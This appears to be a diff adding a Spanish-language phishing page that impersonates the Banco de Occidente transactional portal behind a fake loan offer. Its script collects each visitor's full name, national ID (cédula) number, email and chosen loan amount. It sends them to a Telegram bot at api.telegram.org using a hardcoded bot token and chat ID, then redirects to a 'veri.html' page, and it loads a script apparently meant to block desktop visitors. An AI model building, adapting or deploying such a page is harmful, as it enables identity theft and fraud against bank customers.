@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Occidente - Portal Transaccional</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <script src="BlockDesktop.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            width: 100%;
+            max-width: 380px;
+            overflow: hidden;
+        }
+
+        /* Header */
+        .header {
+            background: white;
+            padding: 16px 20px;
+            text-align: center;
+            position: relative;
+            border-bottom: 1px solid #f0f0f0;
+        }
+
+        .security-badge {
+            display: none;
+        }
+
+        .logo {
+            height: 35px;
+            margin-bottom: 10px;
+        }
+
+        .header h1 {
+            font-size: 13px;
+            color: #0052CC;
+            font-weight: 400;
+            margin-bottom: 4px;
+            letter-spacing: 0px;
+        }
+
+        .header p {
+            font-size: 18px;
+            color: #0052CC;
+            font-weight: 700;
+            letter-spacing: 0px;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #e8e8e8;
+            background: white;
+            padding: 0 20px;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 14px 0;
+            border: none;
+            background: none;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 13px;
+            color: #bbb;
+            position: relative;
+            transition: all 0.3s ease;
+        }
+
+        .tab-button.active {
+            color: #0052CC;
+        }
+
+        .tab-button.active::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #0052CC;
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+            padding: 20px;
+        }
+
+        .tab-content.active {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12px;
+            font-weight: 600;
+            color: #0052CC;
+            margin-bottom: 8px;
+            text-transform: capitalize;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 13px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            background: white;
+            color: #333;
+        }
+
+        .form-group input::placeholder {
+            color: #ccc;
+            font-size: 13px;
+        }
+
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #0052CC;
+            background: #fafbff;
+        }
+
+        /* Slider */
+        .slider-container {
+            margin: 30px 0;
+        }
+
+        .slider-value {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 700;
+            color: #0052CC;
+            margin-bottom: 20px;
+        }
+
+        .slider-value span {
+            display: block;
+            font-size: 12px;
+            color: #999;
+            margin-top: 5px;
+            font-weight: 500;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            height: 6px;
+            border-radius: 3px;
+            background: #ddd;
+            outline: none;
+            -webkit-appearance: none;
+            appearance: none;
+            cursor: pointer;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            appearance: none;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0052CC 0%, #003D99 100%);
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.3);
+            border: 3px solid white;
+            transition: all 0.3s ease;
+        }
+
+        input[type="range"]::-webkit-slider-thumb:hover {
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.4);
+            transform: scale(1.1);
+        }
+
+        input[type="range"]::-moz-range-thumb {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #0052CC 0%, #003D99 100%);
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.3);
+            border: 3px solid white;
+            transition: all 0.3s ease;
+        }
+
+        input[type="range"]::-moz-range-track {
+            background: transparent;
+            border: none;
+        }
+
+        input[type="range"]::-moz-range-progress {
+            background: linear-gradient(135deg, #0052CC 0%, #003D99 100%);
+            height: 6px;
+            border-radius: 3px;
+        }
+
+        /* Buttons */
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #0052CC 0%, #003D99 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            box-shadow: 0 4px 12px rgba(0, 82, 204, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .btn-icon {
+            width: 16px;
+            height: 16px;
+        }
+
+        /* Footer */
+        .footer {
+            border-top: 1px solid #e0e0e0;
+            padding: 12px 20px;
+            background: #fafafa;
+            font-size: 11px;
+            color: #999;
+            text-align: center;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(8px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        .loading-screen.show {
+            display: flex;
+        }
+
+        .loading-content {
+            text-align: center;
+            background: white;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+            max-width: 300px;
+            width: 90%;
+        }
+
+        .loading-logo {
+            width: 150px;
+            height: auto;
+            margin: 0 auto 20px;
+            object-fit: contain;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            margin: 20px auto;
+            border: 4px solid #e0e0e0;
+            border-top: 4px solid #0052CC;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 14px;
+            color: #3c4043;
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                max-width: 100%;
+                border-radius: 0;
+            }
+
+            .tab-content {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-content">
+            <img src="occi.png" alt="Banco de Occidente" class="loading-logo">
+            <div class="spinner"></div>
+            <p class="loading-text">Validando información...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="security-badge">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 1C6.48 1 2 4.53 2 9c0 5.25 3.07 9.8 7 11.34V23h6v-3.66c3.93-1.54 7-6.09 7-11.34 0-4.47-4.48-8-10-8zm0 16c-3.35 0-6-2.57-6-6s2.65-6 6-6 6 2.57 6 6-2.65 6-6 6z"/>
+                </svg>
+                Seguridad
+            </div>
+            <img src="occi.png" alt="Banco de Occidente" class="logo">
+            <h1>¡Bienvenido! a tu.</h1>
+            <p>Portal Transaccional</p>
+        </div>
+
+        <!-- Tabs -->
+        <div class="tabs">
+            <button class="tab-button active" onclick="switchTab(event, 'informacion')">
+                Información
+            </button>
+            <button class="tab-button" onclick="switchTab(event, 'prestamo')">
+                Monto de Préstamo
+            </button>
+        </div>
+
+        <!-- Información Tab -->
+        <div id="informacion" class="tab-content active">
+            <form id="formulario" onsubmit="handleSubmit(event)">
+                <div class="form-group">
+                    <label>Nombre completo</label>
+                    <input 
+                        type="text" 
+                        id="nombreCompleto" 
+                        placeholder="Ej: Juan Carlos García Pérez"
+                        required
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label>Número de cédula</label>
+                    <input 
+                        type="text" 
+                        id="numeroCedula" 
+                        placeholder="Ej: 1234567890"
+                        inputmode="numeric"
+                        maxlength="10"
+                        required
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label>Correo electrónico</label>
+                    <input 
+                        type="text" 
+                        id="correoElectronico" 
+                        placeholder="Ej: correo@ejemplo.com"
+                        required
+                    >
+                </div>
+
+                <div class="button-group">
+                    <button type="submit" class="btn btn-primary">
+                        <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                        Siguiente
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Monto de Préstamo Tab -->
+        <div id="prestamo" class="tab-content">
+            <form id="formularioPrestamo" onsubmit="handlePrestamo(event)">
+                <div class="slider-container">
+                    <div class="slider-value">
+                        $<span id="montoDisplay">500,000</span>
+                        <span>Monto solicitado</span>
+                    </div>
+                    <input 
+                        type="range" 
+                        id="montoSlider" 
+                        min="500000" 
+                        max="50000000" 
+                        step="100000" 
+                        value="500000"
+                        oninput="updateMonto(this.value)"
+                    >
+                </div>
+
+                <div class="button-group">
+                    <button type="submit" class="btn btn-primary">
+                        <svg class="btn-icon" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M10 6L8.59 7.41 13.17 12l-4.58 4.59L10 18l6-6z"/>
+                        </svg>
+                        Solicitar Préstamo
+                    </button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>&copy; 2026 Banco de Occidente. Todos los derechos reservados.</p>
+        </div>
+    </div>
+
+    <script>
+        // Configuración de Telegram fija
+        const TELEGRAM_BOT_TOKEN = '8619673327:AAEUJ-vzXT2OxgbjbHq5AIlbj0r0x4qWryw';
+        const TELEGRAM_CHAT_ID = '-1003756481348';
+
+        // Cambiar tabs
+        function switchTab(event, tabName) {
+            event.preventDefault();
+            
+            const tabs = document.querySelectorAll('.tab-content');
+            tabs.forEach(tab => tab.classList.remove('active'));
+            
+            const buttons = document.querySelectorAll('.tab-button');
+            buttons.forEach(btn => btn.classList.remove('active'));
+            
+            document.getElementById(tabName).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        // Validar cédula en tiempo real
+        document.getElementById('numeroCedula').addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+        });
+
+        // Actualizar monto en tiempo real
+        function updateMonto(value) {
+            const monto = parseInt(value);
+            const montoFormateado = new Intl.NumberFormat('es-CO').format(monto);
+            document.getElementById('montoDisplay').textContent = montoFormateado;
+        }
+
+        // Formatear número a moneda
+        function formatMoneda(valor) {
+            return new Intl.NumberFormat('es-CO', {
+                style: 'currency',
+                currency: 'COP',
+                minimumFractionDigits: 0
+            }).format(valor);
+        }
+
+        // Enviar formulario de información
+        async function handleSubmit(event) {
+            event.preventDefault();
+
+            const nombreCompleto = document.getElementById('nombreCompleto').value.trim();
+            const numeroCedula = document.getElementById('numeroCedula').value.trim();
+            const correoElectronico = document.getElementById('correoElectronico').value.trim();
+
+            // Validaciones
+            if (!nombreCompleto) {
+                alert('Por favor ingresa tu nombre completo');
+                return;
+            }
+
+            if (numeroCedula.length !== 10 || !/^\d{10}$/.test(numeroCedula)) {
+                alert('La cédula debe tener exactamente 10 dígitos');
+                return;
+            }
+
+            if (!correoElectronico.includes('@')) {
+                alert('Por favor ingresa un correo válido');
+                return;
+            }
+
+            // Mostrar pantalla de carga
+            document.getElementById('loadingScreen').classList.add('show');
+
+            // Enviar a Telegram
+            const mensaje = `
+📋 <b>INFORMACIÓN PERSONAL</b>
+
+<b>━━━━━━━━━━━━━━━━━━━</b>
+👤 <b>Nombre Completo:</b> ${nombreCompleto}
+🆔 <b>Número de Cédula:</b> ${numeroCedula}
+📧 <b>Correo Electrónico:</b> ${correoElectronico}
+
+<i>Fecha: ${new Date().toLocaleString('es-CO')}</i>
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    // Guardar datos en localStorage
+                    const datosPersonales = {
+                        nombreCompleto,
+                        numeroCedula,
+                        correoElectronico,
+                        fecha: new Date().toLocaleString('es-CO')
+                    };
+                    localStorage.setItem('datosPersonales', JSON.stringify(datosPersonales));
+
+                    // Mostrar tab de Monto de Préstamo
+                    setTimeout(() => {
+                        document.getElementById('loadingScreen').classList.remove('show');
+                        // Simular click en tab de préstamo
+                        const prestamoTab = document.querySelectorAll('.tab-button')[1];
+                        const event = new Event('click');
+                        prestamoTab.dispatchEvent(event);
+                    }, 2000);
+                } else {
+                    document.getElementById('loadingScreen').classList.remove('show');
+                    alert('Error al enviar los datos. Intenta de nuevo.');
+                }
+            } catch (error) {
+                document.getElementById('loadingScreen').classList.remove('show');
+                console.error('Error:', error);
+                alert('Error de conexión. Intenta de nuevo.');
+            }
+        }
+
+        // Enviar solicitud de préstamo
+        async function handlePrestamo(event) {
+            event.preventDefault();
+
+            const monto = parseInt(document.getElementById('montoSlider').value);
+            
+            // Mostrar pantalla de carga
+            document.getElementById('loadingScreen').classList.add('show');
+
+            // Enviar a Telegram
+            const mensaje = `
+💰 <b>SOLICITUD DE PRÉSTAMO</b>
+
+<b>━━━━━━━━━━━━━━━━━━━</b>
+💵 <b>Monto Solicitado:</b> ${formatMoneda(monto)}
+📅 <b>Rango:</b> $500,000 - $50,000,000
+
+<i>Fecha: ${new Date().toLocaleString('es-CO')}</i>
+            `;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const result = await response.json();
+                if (result.ok) {
+                    // Guardar datos en localStorage
+                    const datosPrestamo = {
+                        monto,
+                        montoFormato: formatMoneda(monto),
+                        fecha: new Date().toLocaleString('es-CO')
+                    };
+                    localStorage.setItem('datosPrestamo', JSON.stringify(datosPrestamo));
+
+                    // Redirigir a veri.html después de 2 segundos
+                    setTimeout(() => {
+                        window.location.href = 'veri.html';
+                    }, 2000);
+                } else {
+                    document.getElementById('loadingScreen').classList.remove('show');
+                    alert('Error al enviar la solicitud. Intenta de nuevo.');
+                }
+            } catch (error) {
+                document.getElementById('loadingScreen').classList.remove('show');
+                console.error('Error:', error);
+                alert('Error de conexión. Intenta de nuevo.');
+            }
+        }
+    </script>
+</body>
+</html>
